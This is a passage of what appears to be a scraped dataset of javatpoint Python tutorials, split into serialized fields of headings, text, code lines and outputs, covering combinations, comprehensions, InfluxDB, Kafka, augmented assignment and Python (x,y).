length.', ""In the above program, while implementing the recursive approach, we haven't used any specific module of Python. Like the iteration method, we used a default function to implement the recursion method in code.""]","['First, we have used a default Python function with the input string and length of the combinational set as a parameter. Then, we converted the input string into a tuple. We also checked if the required length of the combination is not more than the length of the string.', 'In this program, we used a condition to check if the required length of the combination. Then, we used the recursion method inside the function with the for loop. After using the recursion method, we returned combinations of the required length from the input string. Last, we took string as input from the user and returned combinations of three sets in output.']","['# Import numpy module in program', 'import numpy as np', '# Default function to use iterative approach', 'def RecurCombo(iterArray, num):', 'char = tuple(iterArray) # converting input string into a tuple', 'm = len(char) # length of string or tuple', 'if num > m: # checking if length of combinations is more than length of string', 'return', 'index = np.arange(num) # using numpy arrange() function', '# Yielding the first sequence', 'yield tuple(char[i] for i in index)', '# Using while loop with true condition', 'while True:', '# iterating over the tuple we made using reversed for loop', 'for a in reversed(range(num)):', 'if index[a] != a + m - num:', 'break', 'else:', 'return', 'index[a] += 1', '# another for loop iteration', 'for b in range(a + 1, num):', 'index[b] = index[b - 1] + 1', 'yield tuple(char[a] for a in index) # yielding possible combinations from given string', '# Taking an input string from user', 'inputArray = input(""Enter an input string to find combinations: "")', '# Printing different combinations as result in output', 'print(""All possible combinations of three letter sets from the string given by you is: "")', 'print([x for x in RecurCombo(inputArray, 3)])', '# Default Python function to use recursive approach', 'def RecurCombo(array, num):', 'if num == 0:', 'return [[]] # if length for combination is 0', 'l =[] # list to printed in result', '# Using for loop to implement recursive approach', 'for j in range(0, len(array)):', 'emptyArray = array[j] # define an empty array to print list of sets', 'recurList = array[j + 1:]', '# Recursion method on list defined in function', 'for x in RecurCombo(recurList, num-1):', 'l.append([emptyArray]+x) # appending list', 'return l # list as result of recursion', 'if __name__==""__main__"":', '# Taking an input string from user', 'inputArray = input(""Enter an input string to find combinations: "")', '# Printing different combinations as result in output', 'print(""All possible combinations of three letter sets from the string given by you is: "")', 'print(RecurCombo([a for a in inputArray], 3))']","['Enter an input string to find combinations: JavaTpoint', 'All possible combinations of three letter sets from the string given by you is:', ""[('J', 'a', 'v'), ('J', 'a', 'a'), ('J', 'a', 'T'), ('J', 'a', 'p'), ('J', 'a', 'o'), ('J', 'a', 'i'), ('J', 'a', 'n'), ('J', 'a', 't')]"", 'Enter an input string to find combinations: Python', 'All possible combinations of three letter sets from the string given by you is:', ""[['P', 'y', 't'], ['P', 'y', 'h'], ['P', 'y', 'o'], ['P', 'y', 'n'], ['P', 't', 'h'], ['P', 't', 'o'], ['P', 't', 'n'], ['P', 'h', 'o'], ['P', 'h', 'n'], ['P', 'o', 'n'], ['y', 't', 'h'], ['y', 't', 'o'], ['y', 't', 'n'], ['y', 'h', 'o'], ['y', 'h', 'n'], ['y', 'o', 'n'], ['t', 'h', 'o'], ['t', 'h', 'n'], ['t', 'o', 'n'], ['h', 'o', 'n']]""]",[],['|||Using Iteration method|||Using recursion method|||']
276,['Python Comprehensions'],"['In this article, we shall see how comprehension can be done in the data structures of Python like lists, dictionaries, set, and generators.']","['https://www.javatpoint.com/Influxdb-in-python', 'https://www.javatpoint.com/python-combination-without-itertools', 'https://www.javatpoint.com/Influxdb-in-python', 'https://www.javatpoint.com/python-combination-without-itertools', 'https://www.javatpoint.com/Influxdb-in-python']",[],[],"['List Comprehension', 'Dictionary Comprehension', 'Set Comprehension', 'Generator Comprehension']",[],[],"['Comprehension provides a precise way of writing a program in Python. It reduces the code size without affecting its easy readability.', 'So, here we will discuss the following comprehensions -', 'We know that the elements of a list are enclosed in square brackets and it can hold values of multiple data types.', 'In the program given below, we will take out the even numbers from the list.', ""Let's see the below example of list."", 'In the program given below, we performed the same using list comprehension.', 'Example - 2-Using List Comprehension', 'Here, we can observe that we provided the comprehension in list2 where we used for loop and decision making in a single line.', 'The next program is based on obtaining the cube of all elements present in list1.', 'Example - 3', 'We used the append() method and stored the cube of each element in list2 and then displayed it.', 'We co do the same thing using list comprehension-', 'Example - 4-Using List Comprehension', 'We all know that dictionary uses key-value pairs, let us have a look at the program of displaying these pairs.', 'In the next program, the same thing is implemented using comprehension', 'Example - 2-Usind Dictionary Comprehension', ""Set is used to display the unique elements from a given collection. Let's obtain the square of all elements of list using set."", 'Example - 1', 'In the program given below, we have done the same thing using comprehension.', 'Example - 2- Using set comprehension', 'We have taken each element from list1 and provided the expression in result_set for calculating the square of these elements.', 'The generators are the quite similar to functions. It uses the yield keyword to generate a value. Let us see how comprehension can be used here.', 'On executing the program, it displays the even elements from list1.']","['Here we have specified the elements of list1, and then used for loop to take each element and checked using modulus operator that it is divisible by 2 or not.', 'Here, we can observe that we provided the comprehension in result_dict where we have given the expression for displaying the key-value pairs from the lists fruits and color.']",[],"['list1= [20,25,24,30,35,40,44]', 'list2=[]', 'for i in list1:', 'if i%2==0:', 'list2.append(i)', 'print(""The elements of list2 are :"" ,list2)', 'list1=[20,25,24,30,35,40,44]', 'list2=[i for i in list1 if i%2==0]', 'print(""The elements obtained using list comprehension are :"" ,list2)', 'list1=[2,3,4,5,6,7,8,9,10]', 'list2=[]', 'for i in list1:', 'list2.append(i**3)', 'print(""The cube of the elements present in list1 is: "",list2)', 'list1=[2,3,4,5,6,7,8,9,10]', 'list2=[i**3 for i in list1 ]', 'print(""The cube of the elements obtained by list comprehension is: "",list2)', ""fruits=['Apple','Bananas','Custard Apple','Pineapple','Blueberries']"", ""color=['Red','Yellow','Green','Brown','Violet']"", 'result_dict={}', 'for key,value in zip(fruits,color):', 'result_dict[key]=value', 'print(""The resultant dictionary would be: "",result_dict)', ""fruits=['Apple','Bananas','Custard Apple','Pineapple','Blueberries']"", ""color=['Red','Yellow','Green','Brown','Violet']"", 'result_dict={key:value for (key,value) in zip(fruits,color)}', 'print(""The resultant dictionary using comprehension would be: "",result_dict)', 'list1=[2,3,4,5,6,7,8,9,10]', 'result_set=set()', 'for i in list1:', 'result_set.add(i**2)', 'print(""The square of the numbers present in list1 is: "",result_set)', 'list1=[2,3,4,5,6,7,8,9,10]', 'result_set={i**2 for i in list1}', 'print(""The square of the numbers obtained through set comprehension: "",result_set)', 'list1=[12,16,17,20,21,24,28,30,31]', 'result_gen=(i for i in list1 if i%2==0)', 'for i in result_gen:', 'print(""The element which is even in list1 is: "",i)']","['The elements of list2 are : [20, 24, 30, 40, 44]', 'The elements obtained using list comprehension are : [20, 24, 30, 40, 44]', 'The cube of the elements present in list1 is:  [8, 27, 64, 125, 216, 343, 512, 729, 1000]', 'The cube of the elements obtained by list comprehension is:  [8, 27, 64, 125, 216, 343, 512, 729, 1000]', ""The resultant dictionary would be:  {'Apple': 'Red', 'Bananas': 'Yellow', 'Custard Apple': 'Green', 'Pineapple': 'Brown', 'Blueberries': 'Violet'}"", ""The resultant dictionary using comprehension would be:  {'Apple': 'Red', 'Bananas': 'Yellow', 'Custard Apple': 'Green', 'Pineapple': 'Brown', 'Blueberries': 'Violet'}"", 'The square of the numbers present in list1 is:  {64, 4, 36, 100, 9, 16, 49, 81, 25}', 'The square of the numbers obtained through set comprehension:  {64, 4, 36, 100, 9, 16, 49, 81, 25}', 'The element which is even in list1 is:  12', 'The element which is even in list1 is:  16', 'The element which is even in list1 is:  20', 'The element which is even in list1 is:  24', 'The element which is even in list1 is:  28', 'The element which is even in list1 is:  30']",[],['|||List Comprehension|||Dictionary Comprehension|||Set Comprehension|||Generator Comprehension|||']
277,['InfluxDB in Python'],"['While searching for monitoring the infrastructure or third-party applications, the built-in plugins of Telegraph become a great choice for us. Or we are searching at system resources such as disk and network utilization or the performance of the MySQL database.']","['https://www.javatpoint.com/kafka-in-python', 'https://www.javatpoint.com/python-comprehensions', 'https://www.javatpoint.com/kafka-in-python', 'https://www.javatpoint.com/python-comprehensions', 'https://www.javatpoint.com/kafka-in-python']",[],[],"['Understanding the InfluxDB Python Client Library', 'Creating the Connection', 'Inserting the Data', 'Querying Data']",['Installing the library'],[],"[""So, let's get started."", 'Once the installation is completed, we can verify it by simply creating a new Python program file and typing the following snippet of code.', 'Explanation:', 'Explanation:', 'Now, let us build a new database named mydatabase in order to the data as shown below:', 'Explanation:', 'In the above snippet of code, we have created a new database named mydatabase using the create_database of the my_Client.', 'We can check whether the database is created with the help of the get_list_database() function of the my_Client, as shown below:', 'Explanation:', 'Finally, we can set the client to use this database using the following snippet of code:', 'Explanation:', 'In the above snippet of code, we have used the switch_database to set the client to use the specified database, i.e., mydatabase.', 'Explanation:', 'Explanation:', 'Explanation:', 'Explanation:', 'Explanation:', 'Explanation:']","['Collecting custom data, whether for a user-facing application or an infrastructure requirement that plugins of Telegraf do not already cover, is probably going to need writing a new block of code.', 'One way would be to run Telegraf together with the application and send the data over a UDP, Unix, or TCP socket, letting Telegraf handle the connection to InfluxDB and batching and writing points.', 'There are multiple languages out there that already have libraries of InfluxDB, many of them managed by its community. We will understand the use of the influxdb-python library.', 'The Influxdb-python library acts as a Python client interacting with InfluxDB. The library is hosted by the GitHub account of InfluxDB and maintained by a trio of community volunteers.', 'We can use the pip installer that is also the simplest way to install the libraries in Python. The syntax to install the influxdb library is shown below:', 'Now, let us save the file and try executing it. If no error is raised, the library is installed properly. However, in case of any exception, try reinstalling or consider taking help from the official documentation.', 'Some other parameters are also available to the InfluxDBClient constructor, involving username and password, which database needs to be connected, whether or not to utilize SSL, timeout, and UDP parameters.', 'In the above snippet of code, we have imported the InfluxDBClient module from the influxdb library. We have then used the module to define the host, port, username, password, ssl, and verify_ssl, and stored the values to the my_Client variable.', 'As we already have the database set, and the default input for the write_points() is JSON, we can invoke the method with the help of the json_body variable as the only parameter, as shown below:', 'In the above example, the my_points variable is a Python Generator, which is a function working similarly to an Iterator; we can iterate over it utilizing a for x in y loop, as shown below:']","['What if we are creating an application, nonetheless, where we like to store the data from the user in a Time Series Database? Maybe we can consider it an Internet of Things (IoT) or application based on smart home, and every user requires access to readings from, for example, their smart toothbrush. We want to store the time and duration of every session of brushing, we can send out alerts reminding the kids to brush their teeth and keep track of things such as the health of the battery, and the duration of the existing brush head has been in use.', 'Let us consider an example based on the smart toothbrush, where we have a base station that runs embedded Linux and communicates with the toothbrush with the help of Bluetooth. We have already written up the block of code listening to the incoming data, and it seems to be working well; now, we want to get it into InfluxDB.', 'This method is absolutely fine if all we require is the data collection; however, if we want to query and get that data for the users, we will probably need to take benefit of one of the libraries of InfluxDB available in different languages in order to handle the interaction with InfluxDB within the application itself.', 'InfluxDB is an open-source time-series database or TSDB, designed and developed by the company named InfluxData. It is written in the Go programming language to store and retrieve the time series data in fields like operations monitoring, Internet of Things sensor data, application metrics, and real-time analytics. It also provides support to data processing from Graphite.', 'In the next step, we will create a new instance of the InfluxDBClient, using the information regarding the server that we have to access. We can use the following snippet of code that will replace the values of host and port with the appropriate URL/IP address and port of the host of InfluxDB. In the following case, we are running locally on the default port:', 'In the above snippet of code, we have imported the InfluxDBClient module from the influxdb library. We have then defined the host and port for the variable named my_Client using the InfluxDBClient() function, where we have defined the values of the parameters such as host and port, respectively.', 'If we have to connect to a remote host at somedomain.com on port 8086 with username (say, anonymous) and password (say, somepass) and with the help of SSL, we could utilize the following snippet of code instead enabling SSL and SSL verification with two other parameters, ssl = True and ssl_verify = True:', 'In the above snippet of code, we have used the get_list_database() function to verify whether the database is created or not. As a result, we can observe that the database named mydatabase is present along with the telegraf and _internal databases we have on the install.', 'Now that we have a database to write data to and the client properly configured, it is time to add some data. We are going to utilize the write_points() method of the client to do so. This method accepts a list of points and some other parameters involving ""batch size"", which provides us the ability to insert data in batches as opposed to all at once. We can use this to insert a large amount of data.', 'The write_points() method has a parameter known as my_points, a list of dictionaries and consists of the points that need to be written to the database. Let us create some sample data now, and insert it. First of all, let us insert three points in JSON format to a variable known as json_body, as shown in the following snippet of code:', 'The above snippet of code indicates the ""brush events"" for the smart toothbrush; each one occurs around eight o\'clock in the morning, is tagged with the username of the person utilizing the toothbrush and an ID of the brush itself (which helps us track the duration of using the same brush head), and has a field containing the duration of the user using the brush, in seconds.', 'In the above snippet of code, we have used the write_points() with the help of the json_body variable as the parameter. As a result, we get a response in terms of a Boolean value which is true, by the function if the write operation has been successful. If we create an application, we would need this data collection to be automatic, inserting points to the database each time a user tries to interact with the toothbrush.', 'Once we have the data in the database, we can try working with some queries in order to get it back out. We will utilize the same client object as we utilized to write data, except this time we will execute a query on InfluxDB and get back the results utilize with the query() function of the client.', 'In the above snippet of code, we have used the query() function returning a ResultSet object containing all the data of the output together with some convenience methods. Our query is requesting all the measurements in the mydatabase database, grouped by user. We can utilize the parameter called .raw in order to access the raw JSON response from InfluxDB.', 'In the above snippet of code, we have used the raw parameter in order to access the raw JSON response from InfluxDB. In most cases, we won\'t have to access the JSON directly. Instead, we can utilize the get_points() method of the ResultSet to get the measurements from the request, filtering by tag or field. If we wanted to iterated through all of Derek\'s brushing sessions; we could get all the points that are grouped under the tag ""user"" with the value ""Derek"", utilizing the following command:', 'In the above snippet of code, we have used the for loop to print the time and duration of each brushing time of a user. Depending on the application, we might iterate through these points in order to compute the average brushing time for the user or just to verify that there has been X number of brushing events per day.']","['$ pip install influxdb', 'from influxdb import InfluxDBClient', '# importing the required module', 'from influxdb import InfluxDBClient', '# defining the host and port', ""my_Client = InfluxDBClient(host = 'localhost', port = 8086)"", '# importing the required module', 'from influxdb import InfluxDBClient', '# defining different entities', 'my_Client = InfluxDBClient(', ""host = 'somedomain.com',"", 'port = 8086,', ""username = 'anonymous',"", 'password = ""somepass"",', 'ssl = True,', 'verify_ssl = True', '# importing the required module', 'from influxdb import InfluxDBClient', '# defining the host and port', 'my_Client = InfluxDBClient(', ""host = 'somedomain.com',"", 'port = 8086,', ""username = 'anonymous',"", 'password = ""somepass"",', 'ssl = True,', 'verify_ssl = True', '# creating a database', ""my_Client.create_database('mydatabase')"", '# importing the required module', 'from influxdb import InfluxDBClient', '# defining the host and port', 'my_Client = InfluxDBClient(', ""host = 'somedomain.com',"", 'port = 8086,', ""username = 'anonymous',"", 'password = ""somepass"",', 'ssl = True,', 'verify_ssl = True', '# creating a database', ""my_Client.create_database('mydatabase')"", '# verifying if the database is created or not', 'my_Client.get_list_database()', '# importing the required module', 'from influxdb import InfluxDBClient', '# defining the host and port', 'my_Client = InfluxDBClient(', ""host = 'somedomain.com',"", 'port = 8086,', ""username = 'anonymous',"", 'password = ""somepass"",', 'ssl = True,', 'verify_ssl = True', '# creating a database', ""my_Client.create_database('mydatabase')"", '# setting client to use specified database', ""my_Client.switch_database('mydatabase')"", 'json_body = [', '""measurement"": ""brushEvents"",', '""tags"": {', '""user"": ""Derek"",', '""brushId"": ""6a89f539-71c6-490d-a28d-6c5d84c0ee2f""', '},', '""time"": ""2021-08-04T8:01:00Z"",', '""fields"": {', '""duration"": 147', '}', '""measurement"": ""brushEvents"",', '""tags"": {', '""user"": ""Derek"",', '""brushId"": ""6a89f539-71c6-4xx90d-a28d-6c5d84c0ee2f""', '},', '""time"": ""2021-08-05T8:04:00Z"",', '""fields"": {', '""duration"": 131', '}', '""measurement"": ""brushEvents"",', '""tags"": {', '""user"": ""Derek"",', '""brushId"": ""6a89f539-71c6-490d-a28d-6c5d84c0ee2f""', '},', '""time"": ""2021-08-06T8:02:00Z"",', '""fields"": {', '""duration"": 124', '}', 'my_Client.write_points(json_body)', 'my_Client.query(\'SELECT ""duration"" FROM ""mydatabase"".""autogen"".""brushEvents"" WHERE time > now() - 4d GROUP BY ""user""\')', 'results.raw', ""my_points = results.get_points(tags = {'user':'Derek'})"", ""my_points = results.get_points(tags = {'user': 'Derek'})"", 'for my_point in my_points:', 'print(""Time: %s, Duration: %i"" % (my_point[\'time\'], my_point[\'duration\']))']","[""[{'name': 'telegraf'}, {'name': '_internal'}, {'name': 'mydatabase'}]"", 'True', ""{'statement_id': 0, 'series': [{'name': 'brushEvents', 'tags': {'user': 'Derek'}, 'columns': ['time', 'duration'], 'values': [['2021-08-04T08:01:00Z', 147], ['2021-08-05T08:04:00Z', 131], ['2018-08-06T08:02:00Z', 124]]}]}"", 'Time: 2021-08-04T08:01:00Z, Duration: 147', 'Time: 2021-08-05T08:04:00Z, Duration: 131', 'Time: 2021-08-06T08:02:00Z, Duration: 124']",[],[]
278,['Kafka Tutorial in Python'],"['In the following tutorial, we will discuss Apache Kafka along with its use in the Python programming language.']","['https://www.javatpoint.com/augmented-assignment-expressions-in-python', 'https://www.javatpoint.com/Influxdb-in-python', 'https://www.javatpoint.com/augmented-assignment-expressions-in-python', 'https://www.javatpoint.com/Influxdb-in-python', 'https://www.javatpoint.com/augmented-assignment-expressions-in-python']","['https://static.javatpoint.com/python/images/kafka-in-python.png', 'https://static.javatpoint.com/python/images/kafka-in-python2.png']",[],"['Understanding the Apache Kafka', 'Some Use Cases of Apache Kafka', 'Understanding the Concepts of Kafka', 'How to access Kafka in Python?', 'Installing the Dependencies', 'Project Code', 'Consuming the Data']",[],"['Note: The value serializer will automatically transform and encode the data.', 'Note: It is possible to insert callbacks to all the actions in this loop.']","['As per the definition from Wikipedia:', 'We can use Apache Kafka in different places. Let us consider some use cases of Kafka that could help us to figure out its usage:', 'Let us discuss the core concepts of Kafka.', 'There are various libraries available in the Python programming language to use Kafka. Some of these libraries are described below:', 'We will use Kafka-Python for this project. So, we can install it manually using the pip installer as shown below:', 'Now, let us start building the project.', 'In the following example, let us create a new Python program file named produce.py and begin with importing some required libraries and modules.', 'File: produce.py', 'Explanation:', 'Let us consider the following snippet of code for the same.', 'File: produce.py', 'Explanation:', 'We can perform this by calling the send method on the producer and detailing the topic and the data.', 'File: produce.py', 'Explanation:', 'Let us consider the following snippet of code, to begin with.', 'File: consume.py', 'Explanation:', 'In the above snippet of code, we have imported the required modules from their respective libraries.', 'Let us consider the following snippet of code for the same.', 'File: consume.py', 'Explanation:', 'File: consume.py', 'Explanation:', 'The next line inserts the data into the database collection. The last line will print a confirmation that the message was added to our collection.', 'File: consume.py', 'Explanation:']","['Apache Kafka is an open-source stream platform that was originally designed by LinkedIn. Later, it was handed over to Apache Foundation and open-sourced in 2011.', 'We can think of it as a giant commit log where we can store the data in order of its happening. The users of this log can just access and utilize it as per their needs.', 'Now, let us consider a simple example, there is a go-down or a warehouse of a restaurant where all the raw material is stored, such as vegetables, rice, flour, and a lot more.', 'In the following example, we will create a producer that produces numbers ranging from 1 to 500 and send them to the Kafka broker. Later a consumer will read that data from the broker and keep them in a MongoDB collection.', 'In the above snippet of code, we have imported the required libraries and modules. Now, let us initialize a new Kafka producer. Note the following parameters:', 'In the above snippet of code, we have initialized the Kafka producer using the KafkaProducer() function, where we have used the parameters described above.', 'We can take five seconds of a break in order to conclude the iteration. In case we have to confirm whether the broker received the message, it is advised to include a callback.', 'In the above snippet of code, we have used the for-loop to iterate the number ranging from one to 500. We have also added the interval of five seconds between each iteration.', 'Moreover, somebody can also replace the mongo code with any other code as per needs. We can code this in order to enter the data into another database, code to process the data, or anything else one can think of.', ""Let us create the Kafka Consumer. We will use the KafkaConsumer() function for this work; so let's have a closer look at the parameters used in this function."", 'In the above snippet of code, we have used the KafkaConsumer() function to generate the Kafka Consumer. We have also added the parameters within the function that we studied earlier.', 'Now, let us consider the following snippet of code to connect to the testnum collection (This collection is similar to a table in a relational database) of the MongoDB database.', 'In the above snippet of code, we have used the for-loop to iterate through the consumer in order to extract the data. Now in order to test the code, one can execute the produce.py file first and then consume.py.']","['Apache Kafka is an open-source platform developed by the Apache Software Foundation used for processing streams. It is written in Java and Scala. The goal of the project is to offer a high-throughput, unified, low-latency platform in order to handle real-time data feeds. The storage layer of the Apache Kafka is fundamentally a ""massively scalable pub/sub message queue designed as a distributed transaction log,"" that makes it extremely valuable for enterprise infrastructures in order to process streaming data. Moreover, Kafka connects to external systems (for importing and exporting data) through Kafka Connect and offers Kafka Streams, a library for Java stream processing.', 'The restaurant serves various kinds of dishes like Indian, Italian, Chinese and many more. The cooks of each cuisine can refer to the warehouse to select the required objects and make dishes. There may be a chance that all cooks from different cuisine use the same stuff made up of raw materials. This can be any secret ingredient that is utilized in every kind of dish. In the following case, the warehouse acts as a broker, the merchants of the goods are the producers, the goods and the secret ingredient created by cooks are topics, and cooks are consumers.', 'One of the benefits of utilizing Kafka is that in case a consumer breaks down, another or fixed consumer will continue reading where the earlier one left. This is a good method to confirm that all the data is fed into the database without missing data or duplicates.', 'Now, we have to generate numbers ranging from 1 to 500. We can perform this using a for-loop where we use every number as a value in a dictionary with one key: num. This key is used as a key of the data only, not as the key of the topic. Within the same loop, we will also send the data to a broker.', 'If somebody wants to test the code, it is recommended to create a new topic and send the data to that newly generated topic. This method will avoid any case of duplicate values and possible confusion in the testnum topic when we will be testing the producer and consumer together.', ""Before we get started with the coding part of the consumer, let us create a new Python program file and name it consume.py. We will import some of the modules such as json.loads, MongoClient and KafkaConsumer. Since PyMongo is out of the scope of this tutorial, we won't be digging any deeper into its code."", 'In the above snippet of code, we have defined a variable as my_client that uses the MongoClient() function specified with the host and port. We have then defined another variable as my_collection that uses the my_client variable to access the data in the testnum topic.', 'This data can be extracted from the consumer by looping through it (here, the consumer can be considered as an iterable). The consumer will keep listening until the broker does not respond anymore. We can access the message value using the value attribute. Here, we overwrite the message with the message value.']","['$ pip install kafka-python', '# importing the required libraries', 'from time import sleep', 'from json import dumps', 'from kafka import KafkaProducer', '# initializing the Kafka producer', 'my_producer = KafkaProducer(', ""bootstrap_servers = ['localhost:9092'],"", ""value_serializer = lambda x:dumps(x).encode('utf-8')"", '# generating the numbers ranging from 1 to 500', 'for n in range(500):', ""my_data = {'num' : n}"", ""my_producer.send('testnum', value = my_data)"", 'sleep(5)', '# importing the required modules', 'from json import loads', 'from kafka import KafkaConsumer', 'from pymongo import MongoClient', '# generating the Kafka Consumer', 'my_consumer = KafkaConsumer(', ""'testnum',"", ""bootstrap_servers = ['localhost : 9092'],"", ""auto_offset_reset = 'earliest',"", 'enable_auto_commit = True,', ""group_id = 'my-group',"", ""value_deserializer = lambda x : loads(x.decode('utf-8'))"", ""my_client = MongoClient('localhost : 27017')"", 'my_collection = my_client.testnum.testnum', 'for message in my_consumer:', 'message = message.value', 'collection.insert_one(message)', 'print(message + "" added to "" + my_collection)']",[],"['S. No.|||Library|||Description&&&1|||Kafka-Python|||This is an open-source library designed by the Python community.&&&2|||PyKafka|||This library is maintained by Parsly and it has claimed to be a Pythonic API. However, we cannot create dynamic topics in this library like Kafka-Python.&&&3|||Confluent Python Kafka|||This library is provided by Confluent as a thin wrapper around librdkafka. Thus, it performs better than the above two.']","[""|||Activity Monitoring:We can use Kafka to monitor activities. The activity could belong to a physical sensor and device or a website. Producers can publish raw data from data sources that can later be utilized to find trends and patterns.|||Messaging:We can also use Kafka as a message broker among services. If we are implementing a microservice architecture, we can have a microservice as a producer and another as a consumer. For example, we have a microservice responsible for creating new accounts and sending emails to users related to account creation.|||Log Aggregation:We can also utilize Kafka for collecting logs from distinct systems and store them in a centralized system for further processing.|||ETL: Kafka offers a feature of almost real-time streaming; hence, we can develop an ETL based on the requirement.|||Database:Based on things we have mentioned earlier, we can say that Kafka also acts as a database. It is not a typical database that has a feature of data querying per requirement, but Kafka can store data as long as we require without consuming it.||||||Topics:Every message that is feed into the system must be part of some topic. The topic is a stream of records. The messages are store in the format of key-value pairs. Every message is assigned a sequence, known as Offset. The result of one message could be an input of the other for further processing.|||Producers:Producers are the applications responsible for publishing the data into the Kafka system. They publish the data on the topic of their choice.|||Consumer: There are Consumers applications that uses the messages published into topics. A consumer gets a subscription of the topic of its preference and consumes the data.|||Broker: A broker is an instance of Kafka which is responsible for the message exchange. We can use Kafka as a part of a cluster or a stand-alone machine.||||||bootstrap_servers = ['localhost: 9092']: This parameter sets the host and port to contact the producer to bootstrap initial cluster metadata. It is not mandatory to set this here, as the default host and port is localhost: 9092.|||value_serializer = lambda x: dumps(x).encode('utf-8'): This parameter functions on the serialization of the data before sending it to the broker. Here, we transform the data into a JSON file and encode it to UTF-8.||||||Topic: The first parameter of the KafkaConsumer() function is the topic. In the following case, it is testnum.|||bootstrap_servers = ['localhost: 9092']: This parameter is same as the producer.|||auto_offset_reset = 'earliest': This parameter is among the other significant parameters. It handles where the consumer restarts reading after being turned off or breaking down and we can set it either to latest or earliest. Whenever we set it to earliest, the consumer begins reading at the latest committed offset. Whenever we set it to the latest, the consumer begins reading at the log's end. And that is exactly what we need here.|||enable_auto_commit = True: This parameter confirms whether the consumer commits its read offset each interval.|||auto_commit_interval_ms = 1000ms: This parameter is used to set the interval between two commits. As messages are coming in every interval of five seconds, committing every second appears to be fair.|||group_id = 'counters': This parameter is the group of consumers to which the consumer belongs. Note that a consumer must be part of a consumer group in order to make them work automatically committed.|||The value deserializer is used to deserialize the data into a general JSON format, the inverse of the working of the value serializer.|||""]"
279,['Augmented Assignment Expressions in Python'],"['In Python, we know how the arithmetic operators can be used to add, subtract, divide and multiply two variables.']","['https://www.javatpoint.com/python-x-y-software', 'https://www.javatpoint.com/kafka-in-python', 'https://www.javatpoint.com/python-x-y-software', 'https://www.javatpoint.com/kafka-in-python', 'https://www.javatpoint.com/python-x-y-software']",[],[],[],"['1. Using +=', '2. Using -=', '3. Using *=', '4. Using /=', '5. Using %=', '6. Using **=', '7. Using //=', '8. Using >>=', '9. Using <<=', '10. Using &=']",[],"['In this article, we will learn how we can extend the functionality of an operator in a precise form at the time of evaluating an expression.', 'Let us have a look at few examples that will make the use of augmented assignment expressions clear to us.', 'We will discuss the following expression -', 'We will have a look at the programs that involve augmented assignment expressions and understand how they can be used.', 'In the program given below, we have done the following operations-', 'In the program given below, we have done the following operations-', 'In the program given below, we have done the following operations-', 'In the program given below, we have done the following operations-', 'In the program given below, we have done the following operations-', 'Example - ', 'In the below program, we have performed the following operations-', 'In the below program, we have performed the following operations-', 'In the below program, we have evaluated the expression for the bitwise right shift between the variables x and y.', 'In the below program, we have evaluated the expression for the bitwise left shift between the variables x and y.', 'In the below program, we have evaluated the expression for bitwise and shift between the variables x and y.', 'So, in this article, we learned how the augmented assignment expressions can be used in Python.']",[],[],"['#adding two numbers x and y', 'print(""Value of z is: "",z)', 'x+=5 #x=x+5', 'print(""Value of x is: "",x)', '#subtracting two numbers x and y', 'print(""Value of z is: "",z)', 'x-=5 #x=x-5', 'print(""Value of x is: "",x)', '#multiplying two numbers x and y', 'print(""Value of z is: "",z)', 'x*=5 #x=x*5', 'print(""Value of x is: "",x)', '#dividing two numbers x and y', 'print(""Value of z is: "",z)', 'x/=5 #x=x/5', 'print(""Value of x is: "",x)', '#modulus of two numbers x and y', 'print(""Value of z is: "",z)', 'x%=5 #x=x%5', 'print(""Value of x is: "",x)', '#power of two numbers x and y', 'print(""Value of z is: "",z)', 'x**=3 #x=x**3', 'print(""Value of x is: "",x)', '#integer division of two numbers x and y', 'print(""Value of z is: "",z)', 'x//=3 #x=x//3', 'print(""Value of x is: "",x)', '#bitwise right shift on two numbers x and y', 'print(""Value of x is: "",x)', '#bitwise left shift on two numbers x and y', 'print(""Value of x is: "",x)', '#bitwise and on two numbers x and y', 'print(""Value of x is: "",x)']","['Value of z is:  25', 'Value of x is:  20', 'Value of z is:  5', 'Value of x is:  10', 'Value of z is:  150', 'Value of x is:  75', 'Value of z is:  1.5', 'Value of x is:  3.0', 'Value of z is:  5', 'Value of x is:  0', 'Value of z is:  225', 'Value of x is:  3375', 'Value of z is:  7', 'Value of x is:  5', 'Value of x is:  3', 'Value of x is:  60', 'Value of x is:  2']",[],"['|||+=|||-=|||*=|||/=|||%=|||**=|||//=|||>>=|||<<=|||&=||||||First, we have added two variables x and y.|||Used augmented assignment addition for adding x and 5.||||||First, we have subtracted two variables x and y.|||Used augmented assignment subtraction for subtracting x and 5.||||||First, we have multiplied two variables x and y.|||Used augmented assignment multiplication for multiplying x and 5.||||||First, we have divided two variables x and y.|||Used augmented assignment division for dividing x and 5.||||||First, we have taken the modulus of two variables x and y.|||Used augmented assignment modulus operation for obtaining results of x and 5.||||||First, we have calculated x raised to the power y.|||Used augmented assignment expression to evaluate x raised to power 3.||||||First, we have calculated the value of the integer division of x and y.|||Used augmented assignment expression to evaluate integer division of x and 3.|||']"
280,"['Python (x,y) Software']","['Python (x,y) is an engineering and scientific development software that is absolutely free to use. Python (x,y) software is used for data analysis, data visualization, and numerical computations. Python (x,y) is based on Spyder interactive scientific development environment, Python programming language, and GUI (Graphical User Interface) based on Qt.']","['https://www.javatpoint.com/python-event-driven-programming', 'https://www.javatpoint.com/augmented-assignment-expressions-in-python', 'https://www.javatpoint.com/python-event-driven-programming', 'https://www.javatpoint.com/augmented-assignment-expressions-in-python', 'https://www.javatpoint.com/python-event-driven-programming']","['https://static.javatpoint.com/python/images/python-x-y-software.png', 'https://static.javatpoint.com/python/images/python-x-y-software2.jpg', 'https://static.javatpoint.com/python/images/python-x-y-software3.jpg', 'https://static.javatpoint.com/python/images/python-x-y-software4.jpg', 'https://static.javatpoint.com/python/images/python-x-y-software5.png']",[],"['What One can do with Python (x,y)?', 'History of Python (x,y)', 'What Python (x,y) exactly is', 'Main features of Python (x,y)', 'Why was Python (x,y) created?']","['Why Python?', 'Why Qt?']",[],"['With the help of Python (x,y) software, we can do the following tasks and analyses:', 'Below are the some important points that we should keep in mind.', 'Python (x,y) software have a lot of features but we will describe some important features.', 'Following was some of the reasons for which the need for Python (x,y) emerged:', 'Python is considered as the far more superior scientific language as compared to any other programming language because of the following reasons:']","['But the only thing generally Python suffers or lacks is the absence of much documentation, even though the growing community of Python contributes to it every day with many great and explanatory tutorials on every topic.']","['Pierre Raybaut was maintaining, conceiving, and developing Python (x,y) software since 2008 with all the future performance-related goals (We will discuss later in this article). In 2011, Gabi Davar joined the Python (x,y) project with Pierre Raybaut and is working on the project as a maintainer since then. Later in the year 2013, Pierre Raybaut moved out of this project to work on various other projects. Since 2013, Gabi Davar is working as the primary maintainer of the Python (x,y) project till 